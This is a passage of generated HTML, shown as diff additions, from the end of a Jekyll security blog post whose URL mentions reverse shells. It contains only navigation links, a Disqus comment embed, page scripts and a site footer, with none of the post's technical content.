+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+        
+            </ul>
+        
+
+        <div class="post-recent">
+    <div class="pre">
+        
+        <p><strong>上一篇</strong> <a href="/2017/11/27/pwnos2/">pwnos2.0</a></p>
+        
+    </div>
+    <div class="nex">
+
+        
+        <p><strong>下一篇</strong> <a href="/2017/11/29/port-forwarding/">端口转发</a></p>
+        
+    </div>
+</div>
+
+
+        <h2 id="comments">Comments</h2>
+        
+
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+
+    var disqus_config = function() {
+        this.page.url = 'http://localhost:4000/2017/11/27/reverse-shell/'; // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://localhost:4000/2017/11/27/reverse-shell/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document,
+            s = d.createElement('script');
+
+        s.src = '//http-b404-xyz.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+    </div>
+    <button class="anchor"><i class="fa fa-anchor"></i></button>
+    <div class="right">
+        <div class="wrap">
+
+            <!-- Content -->
+            <div class="side content">
+                <div>
+                    Content
+                </div>
+                <ul id="content-side" class="content-ul">
+                    
+                    <li><a href="#similar_posts">Similar Posts</a></li>
+                    
+                    <li><a href="#comments">Comments</a></li>
+                </ul>
+            </div>
+            <!-- 其他div框放到这里 -->
+            <!-- <div class="side">bbbb</div> -->
+        </div>
+    </div>
+</div>
+<script>
+/**
+ * target _blank
+ */
+(function() {
+    var aTags = document.querySelectorAll('article a:not([id])')
+    for (var i = 0; i < aTags.length; i++) {
+        aTags[i].setAttribute('target', '_blank')
+    }
+}());
+</script>
+<script src="/js/pageContent.js " charset="utf-8"></script>
+
+
+    <footer class="site-footer">
+
+
+    <div class="wrapper">
+
+        <p class="description">
+             The quieter you become, the more you can hear. 
+        </p>
+
+        <br>
+        <p class="contact">
+             
+            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
+            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
+            
+        </p>
+        <!--
+        <p>
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        </p>
+    -->
+        <p class="power">
+            <span>
+                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
+            </span>
+        </p>
+    </div>
+</footer>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <div class="back-to-top">
+    <a href="#top" data-scroll>
+        <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    </a>
+</div>
+
+    <script src=" /js/main.js " charset="utf-8"></script>
+    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
+    <script type="text/javascript">
+      smoothScroll.init({
+        speed: 500, // Integer. How fast to complete the scroll in milliseconds
+        easing: 'easeInOutCubic', // Easing pattern to use
+        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
+      });
+    </script>
+    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
+  </body>
+
+</html>
